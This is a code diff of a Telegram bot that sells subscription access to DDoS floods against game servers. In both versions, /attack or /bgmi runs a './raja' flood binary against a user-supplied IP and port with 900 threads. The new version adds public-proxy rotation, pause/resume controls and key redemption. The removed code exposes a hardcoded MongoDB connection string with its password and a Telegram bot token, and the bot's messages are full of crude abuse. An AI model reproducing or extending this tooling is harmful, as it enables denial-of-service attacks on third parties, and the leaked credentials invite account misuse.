@@ -1,327 +1,370 @@
-import asyncio
+import logging
+import signal
+import subprocess
+import json
 import random
 import string
-import logging
-from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
-from pymongo import MongoClient
-from datetime import datetime, timedelta, timezone
+import datetime
+import itertools
+import requests
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from rajaji import BOT_TOKEN, ADMIN_IDS
+from keep_alive import keep_alive
+keep_alive()
 
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+USER_FILE = "users.json"
+KEY_FILE = "keys.json"
 
-MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
-client = MongoClient(MONGO_URI)
-db = client['rabvjl']
-users_collection = db['VAMPIREXCHEATS']
-redeem_codes_collection = db['redeem_codes0']
+DEFAULT_THREADS = 900
 
-TELEGRAM_BOT_TOKEN = '7630314402:AAHggWxqMD7vetT2HicGAjs2G_cEBIFxfN0'
-ADMIN_USER_ID = 7855020275 
+user_processes = {}
+users = {}
+keys = {}
 
-cooldown_dict = {}
-user_attack_history = {}
-valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')
+# Player statistics storage
+player_stats = {}
 
-async def help_command(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        help_text = (
-            "*Here are the commands you can use:* \n\n"
-            "*💦💣 /start* - Start interacting with the bot.\n"
-            "*💦💣 /attack* - Trigger an attack operation.\n"
-            "*💦💣 /redeem* - Redeem a code.\n"
-            "*💦💣 /get_id* - Get Your Id?.\n"
-        )
-    else:
-        help_text = (
-            "*☄️ Available Commands for Admins:*\n\n"
-            "*💦💣 /start* - Start the bot.\n"
-            "*💦💣 /attack* - Start the attack.\n"
-            "*💦💣 /get_id* - Get user id.\n"
-            "*💦💣 /remove [user_id]* - Remove a user.\n"
-            "*💦💣 /users* - List all allowed users.\n"
-            "*💦💣 /gen* - Generate a redeem code.\n"
-            "*💦💣 /redeem* - Redeem a code.\n"
-        )
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')
-    
-async def start(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  
-    user_name = update.effective_user.first_name  
-    if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @rajaraj_04! /get_id*", parse_mode='Markdown')
-        return
-    message = (
-       "*😊🔥HELLO DEVAR JI WELCOME TO DESI HOT 🥵 BHABHI DDOS *\n\n"
-        "*💀CHODNE KE LIYE YE DBAYE /attack <ip> <port> <duration>*\n"
-        "*💦BHABHI KI CHUDAYI RAJA KREGA🫣 @rajaraj_04 🚀*" 
-    )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+# Set up logging
+logging.basicConfig(level=logging.INFO)
 
-async def remove_user(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*💪 nikal lode!*", parse_mode='Markdown')
-        return
-    if len(context.args) != 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
-        return
-    target_user_id = int(context.args[0])
-    users_collection.delete_one({"user_id": target_user_id})
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')
+# Proxy related functions
+proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
+proxy_iterator = None
 
-async def is_user_allowed(user_id):
-    user = users_collection.find_one({"user_id": user_id})
-    if user:
-        expiry_date = user['expiry_date']
-        if expiry_date:
-            if expiry_date.tzinfo is None:
-                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
-            if expiry_date > datetime.now(timezone.utc):
-                return True
-    return False
-
-async def attack(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-    
-    # Check user authorization
-    if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*ruk access le phale*", parse_mode='Markdown')
-        return
-    
-    # Validate attack arguments
-    args = context.args
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*🚀 Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
-        return
-    
-    ip, port, duration = args
-    
-    # Validate IP
-    if not ip.startswith(valid_ip_prefixes):
-        await context.bot.send_message(chat_id=chat_id, text="*glt h bahen chod💦💦💦.*", parse_mode='Markdown')
-        return
-    
-    # Validate duration
+def get_proxies():
+    global proxy_iterator
     try:
-        duration = int(duration)
-        if duration > 200:  # New duration limit
-            response = "*ruk madharcod 🥵200 200 krke do lgale lode.*" 
-            await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown') 
-            return
-    except ValueError:
-        await context.bot.send_message(chat_id=chat_id, text="*glt ip dalta h madharcod 😡.*", parse_mode='Markdown')
-        return
-    
-    # Cooldown check
-    cooldown_period = 60
-    current_time = datetime.now()
-    if user_id in cooldown_dict:
-        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
-        if time_diff < cooldown_period:
-            remaining_time = cooldown_period - int(time_diff)
-            await context.bot.send_message(
-                chat_id=chat_id,
-                text=f"*Wait {remaining_time} seconds before next attack*",
-                parse_mode='Markdown'
-            )
-            return
-    
-    # Attack history check
-    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
-        await context.bot.send_message(chat_id=chat_id, text="*pahle hi chod diya h to baar baar kya gand dega!*", parse_mode='Markdown')
-        return
-    
-    # Update cooldown and attack history
-    cooldown_dict[user_id] = current_time
-    if user_id not in user_attack_history:
-        user_attack_history[user_id] = set()
-    user_attack_history[user_id].add((ip, port))
-    
-    # Send attack confirmation
-    await context.bot.send_message(
-        chat_id=chat_id,
-        text=(
-            f"*😧 RAJA 🥵SEVER FREEZ!❗ 💀*\n"
-        f"💦chodna shuru*!* 💦\n\n"
-        f"*🤯 flat room: {ip}:{port}*\n"
-        f"*🤣 kitne der: {duration} seconds*\n"
-        f"*🔥chudai chalu h feedback bhej dena @rajaraj_04💥*"
-    ), parse_mode='Markdown')
-
-    # Run attack asynchronously
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
-    
-async def rajaraj_04(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id 
-    message = f"YOUR USER ID: `{user_id}`" 
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
-
-async def run_attack(chat_id, ip, port, duration, context):
-    try:
-        process = await asyncio.create_subprocess_shell(
-            f"./raja {ip} {port} {duration} 900",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
+        response = requests.get(proxy_api_url)
+        if response.status_code == 200:
+            proxies = response.text.splitlines()
+            if proxies:
+                proxy_iterator = itertools.cycle(proxies)
+                return proxy_iterator
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
-    finally:
-        await context.bot.send_message(chat_id=chat_id, text="*😈Bas maal gir gya! 💦💦💦*\n*BGMI KO CHODNE WALE FEEDBACK DE @RAJARAJ_04!*", parse_mode='Markdown')
+        logging.error(f"Error fetching proxies: {str(e)}")
+    return None
 
-async def generate_redeem_code(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*tere bas ki nhi h lode!*", 
-            parse_mode='Markdown'
-        )
-        return
-    if len(context.args) < 1:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
-            parse_mode='Markdown'
-        )
-        return
-    max_uses = 1
-    custom_code = None
-    time_input = context.args[0]
-    if time_input[-1].lower() in ['d', 'm']:
-        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+def get_next_proxy():
+    global proxy_iterator
+    if proxy_iterator is None:
+        proxy_iterator = get_proxies()
+        if proxy_iterator is None:  # If proxies are not available
+            return None
+    return next(proxy_iterator, None)
+
+def load_data():
+    global users, keys
+    users = load_users()
+    keys = load_keys()
+
+def load_users():
+    try:
+        with open(USER_FILE, "r") as file:
+            return json.load(file)
+    except FileNotFoundError:
+        return {}
+    except Exception as e:
+        logging.error(f"Error loading users: {e}")
+        return {}
+
+def save_users():
+    try:
+        with open(USER_FILE, "w") as file:
+            json.dump(users, file)
+    except Exception as e:
+        logging.error(f"Error saving users: {str(e)}")
+
+def load_keys():
+    try:
+        with open(KEY_FILE, "r") as file:
+            return json.load(file)
+    except FileNotFoundError:
+        return {}
+    except Exception as e:
+        logging.error(f"Error loading keys: {e}")
+        return {}
+
+def save_keys():
+    try:
+        with open(KEY_FILE, "w") as file:
+            json.dump(keys, file)
+    except Exception as e:
+        logging.error(f"Error saving keys: {e}")
+
+def generate_key(length=6):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
+
+def add_time_to_current_date(hours=0, days=0):
+    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
+
+def generate_unique_id(length=10):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
+
+# Function to generate main menu keyboard
+def main_menu_keyboard():
+    return ReplyKeyboardMarkup([ 
+        [KeyboardButton("/bgmi")],
+        [KeyboardButton("/resume ▶️"), KeyboardButton("/pause ⏸️")],
+        [KeyboardButton("/view_attacks 📊")], [KeyboardButton("/stop_attack")],
+        [KeyboardButton("/check_bgmi_traffic 📈 ")], 
+        [KeyboardButton("/help ℹ️")],
+        [KeyboardButton("/genkey 3 hours")],
+        [KeyboardButton("/allusers")],
+        [KeyboardButton("/attack_remove")],
+        
+    ], resize_keyboard=True)
+
+# PlayerStats class to handle player statistics
+class PlayerStats:
+    def __init__(self, name, kills=0, deaths=0, matches_played=0):
+        self.name = name
+        self.kills = kills
+        self.deaths = deaths
+        self.matches_played = matches_played
+
+    def display_stats(self):
+        return (f"Player: {self.name}\n"
+                f"Kills: {self.kills}\n"
+                f"Deaths: {self.deaths}\n"
+                f"Matches Played: {self.matches_played}")
+
+# Command handlers
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    username = update.message.from_user.username
+    if user_id not in users:
+        await update.message.reply_text("❌ You don't have an active subscription. Please contact the admin for assistance.Buy Form @rajaraj_04", reply_markup=main_menu_keyboard())
     else:
-        custom_code = time_input
-        time_input = context.args[1] if len(context.args) > 1 else None
-        redeem_code = custom_code
-    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
-            parse_mode='Markdown'
-        )
-        return
-    if time_input[-1].lower() == 'd':  
-        time_value = int(time_input[:-1])
-        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
-        expiry_label = f"{time_value} day"
-    elif time_input[-1].lower() == 'm':  
-        time_value = int(time_input[:-1])
-        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
-        expiry_label = f"{time_value} minute"
-    if len(context.args) > (2 if custom_code else 1):
-        try:
-            max_uses = int(context.args[2] if custom_code else context.args[1])
-        except ValueError:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id, 
-                text="*⚠️ Please provide a valid number for max uses.*", 
-                parse_mode='Markdown'
-            )
-            return
-    redeem_codes_collection.insert_one({
-        "code": redeem_code,
-        "expiry_date": expiry_date,
-        "used_by": [], 
-        "max_uses": max_uses,
-        "redeem_count": 0
-    })
-    message = (
-        f"✅ Redeem code generated: `{redeem_code}`\n"
-        f"Expires in {expiry_label}\n"
-        f"Max uses: {max_uses}"
-    )
-    await context.bot.send_message(
-        chat_id=update.effective_chat.id, 
-        text=message, 
-        parse_mode='Markdown'
-    )
+        expiration_date = users[user_id]
+        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by @rajaraj_04", reply_markup=main_menu_keyboard())
 
-async def redeem_code(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
+async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await update.message.reply_text("❌ You don't have an active subscription.")
+        return
+
+    if len(context.args) != 3:
+        await update.message.reply_text("🛡️ Usage: /bgmi <target_ip> <port> <duration>")
+        return
+
+    target_ip = context.args[0]
+    try:
+        port = int(context.args[1])
+        duration = int(context.args[2])
+    except ValueError:
+        await update.message.reply_text("⚠️ Port and duration must be integers.")
+        return
+
+    proxy = get_next_proxy()
+    if proxy is None:
+        await update.message.reply_text("🚫 No proxies available.")
+        return
+
+    # Updated command to remove protocol (udp/tcp)
+    command = ['./raja', target_ip, str(port), str(duration), str(DEFAULT_THREADS)]
+    try:
+        process = subprocess.Popen(command)
+        # Generate and display a unique attack ID
+        unique_id = generate_unique_id()
+        user_processes[user_id] = {
+            "process": process,
+            "command": command,
+            "target_ip": target_ip,
+            "port": port,
+            "paused": False,
+            "id": unique_id  # Store the attack ID
+        }
+        
+        await update.message.reply_text(f"🚀 Flooding started on {target_ip}:{port} for {duration} seconds.\n🔑 Attack ID: {unique_id} has been generated for your session.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error starting attack: {str(e)}")
+
+async def display_player_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id not in player_stats:
+        await update.message.reply_text("❌ You don't have player statistics recorded.")
+        return
+
+    stats = player_stats[user_id]
+    await update.message.reply_text(stats.display_stats())
+
+async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id not in user_processes:
+        await update.message.reply_text("🛑 You don't have an active attack.", reply_markup=main_menu_keyboard())
+        return
+    try:
+        user_processes[user_id]["process"].terminate()
+        del user_processes[user_id]
+        await update.message.reply_text("✅ Attack stopped.", reply_markup=main_menu_keyboard())
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error stopping attack: {str(e)}", reply_markup=main_menu_keyboard())
+
+async def pause_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id not in user_processes or user_processes[user_id]["paused"]:
+        await update.message.reply_text("⏸️ No ongoing attack to pause.")
+        return
+    process = user_processes[user_id]["process"]
+    try:
+        process.send_signal(signal.SIGSTOP)
+        user_processes[user_id]["paused"] = True
+        await update.message.reply_text("✅ Attack paused.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error pausing attack: {str(e)}")
+
+async def resume_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id not in user_processes or not user_processes[user_id]["paused"]:
+        await update.message.reply_text("▶️ No paused attack to resume.")
+        return
+    process = user_processes[user_id]["process"]
+    try:
+        process.send_signal(signal.SIGCONT)
+        user_processes[user_id]["paused"] = False
+        await update.message.reply_text("✅ Attack resumed.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error resuming attack: {str(e)}")
+
+async def view_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id not in user_processes:
+        await update.message.reply_text("📊 No ongoing attacks.")
+        return
+
+    attack_details = "\n".join([f"Attack ID: {details['id']}, Target: {details['target_ip']}:{details['port']}" for details in user_processes.values()])
+    await update.message.reply_text(f"📊 Ongoing attacks:\n{attack_details}")
+
+async def attack_remove(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
     if len(context.args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
+        await update.message.reply_text("⚠️ Usage: /attack_remove <attack_id>")
         return
-    code = context.args[0]
-    redeem_entry = redeem_codes_collection.find_one({"code": code})
-    if not redeem_entry:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
-        return
-    expiry_date = redeem_entry['expiry_date']
-    if expiry_date.tzinfo is None:
-        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
-    if expiry_date <= datetime.now(timezone.utc):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
-        return
-    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
-        return
-    if user_id in redeem_entry['used_by']:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
-        return
-    users_collection.update_one(
-        {"user_id": user_id},
-        {"$set": {"expiry_date": expiry_date}},
-        upsert=True
-    )
-    redeem_codes_collection.update_one(
-        {"code": code},
-        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
-    )
-    await context.bot.send_message(chat_id=chat_id, text="*WAH 💣GAND MARNE KE LIYE !*\n*REDEEM 🫣KR LIYA✅.*", parse_mode='Markdown')
 
-async def list_users(update, context):
-    current_time = datetime.now(timezone.utc)
-    users = users_collection.find()    
-    user_list_message = "👥 User List:\n" 
-    for user in users:
-        user_id = user['user_id']
-        expiry_date = user['expiry_date']
-        if expiry_date.tzinfo is None:
-            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
-        time_remaining = expiry_date - current_time
-        if time_remaining.days < 0:
-            remaining_days = -0
-            remaining_hours = 0
-            remaining_minutes = 0
-            expired = True  
-        else:
-            remaining_days = time_remaining.days
-            remaining_hours = time_remaining.seconds // 3600
-            remaining_minutes = (time_remaining.seconds // 60) % 60
-            expired = False      
-        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
-        if expired:
-            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
-        else:
-            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')
-
-def main():
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("remove", remove_user))
-    application.add_handler(CommandHandler("attack", attack))
-    application.add_handler(CommandHandler("gen", generate_redeem_code))
-    application.add_handler(CommandHandler("redeem", redeem_code))
-    application.add_handler(CommandHandler("get_id", rajaraj_04))
-    application.add_handler(CommandHandler("users", list_users))
-    application.add_handler(CommandHandler("help", help_command))
+    attack_id = context.args[0]
+    attack_found = False
+    if user_id in user_processes and user_processes[user_id]["id"] == attack_id:
+        process = user_processes[user_id]["process"]
+        try:
+            process.terminate()
+            del user_processes[user_id]
+            await update.message.reply_text(f"✅ Attack with ID {attack_id} has been stopped and removed.")
+            attack_found = True
+        except Exception as e:
+            await update.message.reply_text(f"❌ Error removing attack: {str(e)}")
     
-    application.run_polling()
-    logger.info("Bot is running.")
+    if not attack_found:
+        await update.message.reply_text(f"❌ No attack found with ID {attack_id}.")
+
+async def check_bgmi_traffic(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    # Simulate checking BGMI traffic
+    await update.message.reply_text("📈 Checking BGMI traffic...\nThe current traffic status is normal. No issues detected.")
+
+async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        command = context.args
+        if len(command) == 2:
+            try:
+                time_amount = int(command[0])
+                time_unit = command[1].lower()
+                if time_unit == 'hours':
+                    expiration_date = add_time_to_current_date(hours=time_amount)
+                elif time_unit == 'days':
+                    expiration_date = add_time_to_current_date(days=time_amount)
+                else:
+                    raise ValueError("Invalid time unit")
+                key = generate_key()
+                keys[key] = expiration_date
+                save_keys()
+                response = f"Key generated: {key}\nExpires on: {expiration_date}"
+            except ValueError:
+                response = "Please specify a valid number and unit of time (hours/days)."
+        else:
+            response = "Usage: /genkey <amount> <hours/days>"
+    else:
+        response = "ONLY OWNER CAN USE💀OWNER @rajaraj_04"
+
+    await update.message.reply_text(response)
+
+async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    command = context.args
+    if len(command) == 1:
+        key = command[0]
+        if key in keys:
+            expiration_date = keys[key]
+            if user_id in users:
+                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
+                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
+                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
+            else:
+                users[user_id] = expiration_date
+            save_users()
+            del keys[key]
+            save_keys()
+            response = f"✅Key redeemed successfully!"
+        else:
+            response = "Invalid or expired key buy from @rajaraj_04."
+    else:
+        response = "Usage: /redeem <key>"
+
+    await update.message.reply_text(response)
+
+async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        if users:
+            response = "Authorized Users:\n"
+            for user_id, expiration_date in users.items():
+                try:
+                    user_info = await context.bot.get_chat(int(user_id), request_kwargs={'proxies': get_proxy_dict()})
+                    username = user_info.username if user_info.username else f"UserID: {user_id}"
+                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
+                except Exception:
+                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
+        else:
+            response = "No data found"
+    else:
+        response = "ONLY OWNER CAN USE."
+    await update.message.reply_text(response)
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    await update.message.reply_text("ℹ️ Help Menu:\n"
+                                      "/start - Start the bot\n"
+                                      "/bgmi - Start a new attack\n"
+                                      "/stop_attack - Stop an ongoing attack\n"
+                                      "/pause - Pause an ongoing attack\n"
+                                      "/resume - Resume a paused attack\n"
+                                      "/view_attacks - View ongoing attacks\n"
+                                      "/attack_remove - Remove an attack using its ID\n"
+                                      "/check_bgmi_traffic - Check current BGMI traffic\n"
+                                      "/redeem - Redeem your key\n"
+                                      "/genkey - Generate a key (Admin only)\n"
+                                      "/allusers - Show all users (Admin only)\n"
+                                      "/help - Display this help message", reply_markup=main_menu_keyboard())
 
 if __name__ == '__main__':
-    main()
+    load_data()
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("bgmi", bgmi))
+    app.add_handler(CommandHandler("stop_attack", stop_attack))
+    app.add_handler(CommandHandler("pause", pause_attack))
+    app.add_handler(CommandHandler("resume", resume_attack))
+    app.add_handler(CommandHandler("view_attacks", view_attacks))
+    app.add_handler(CommandHandler("attack_remove", attack_remove))
+    app.add_handler(CommandHandler("check_bgmi_traffic", check_bgmi_traffic))
+    app.add_handler(CommandHandler("genkey", genkey))
+    app.add_handler(CommandHandler("redeem", redeem))
+    app.add_handler(CommandHandler("allusers", allusers))
+    app.add_handler(CommandHandler("help", help_command))
+
+    app.run_polling()
+
+
